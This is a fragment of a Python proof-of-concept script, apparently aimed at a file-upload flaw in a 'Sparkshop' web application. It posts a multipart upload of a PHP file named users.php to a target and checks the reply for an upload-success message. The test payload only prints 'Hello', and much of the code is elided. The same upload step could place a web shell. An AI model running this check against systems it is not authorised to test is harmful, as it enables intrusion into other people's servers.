...
def banner():
    test = """
 __                  _        _                 
/ _\_ __   __ _ _ __| | _____| |__   ___  _ __  
\ \| '_ \ / _` | '__| |/ / __| '_ \ / _ \| '_ \ 
_\ \ |_) | (_| | |  |   <\__ \ | | | (_) | |_) |
\__/ .__/ \__,_|_|  |_|\_\___/_| |_|\___/| .__/ 
   |_|                                   |_|    """
    print(test)
...
def poc(target, output_file):
    ...
    data = (
        ...
        'Content-Disposition: form-data; name="file"; filename="users.php"\r\n'
        "\r\n"
        '<?php echo "Hello"?>\r\n'
        "------WebKitFormBoundaryj7OlOPiiukkdktZR--"
    )
    ...
    try:
        res = requests.post(
            url=target + payload, headers=headers, data=data, verify=False
        )

        if "上传文件成功" in res.text or "success" in res.text:
